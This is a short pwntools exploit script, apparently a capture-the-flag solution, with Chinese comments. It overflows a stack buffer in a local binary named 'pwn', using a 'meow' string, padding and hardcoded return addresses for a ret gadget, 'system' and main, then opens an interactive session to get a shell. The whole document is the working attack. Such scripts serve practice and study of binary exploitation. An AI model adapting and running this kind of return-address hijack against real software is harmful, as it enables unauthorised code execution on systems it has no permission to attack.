from pwn import *
import ctypes                              # 
context(arch='amd64', os='linux', log_level='debug') # 一些基本的配置。
io = process('./pwn')             # 在本地运行程序。
# gdb.attach(io)                    # 启动 GDB
# io = connect("127.0.0.1",34893)          

system = 0x000000000401236
ret = 0x000000000040101a
main = 0x0000000000401297
payload = b'A'*0x28 + p64(system) 
padding =0x20 + 8 - 4 - 1
payload = b"meow" + b'\0' + padding * b'B' + p64(ret)+ p64(system) + p64(main)
io.sendlineafter(b'What can u say?\n',payload)
io.sendlineafter(b'So,what size is it?\n',b'59') 
io.interactive()
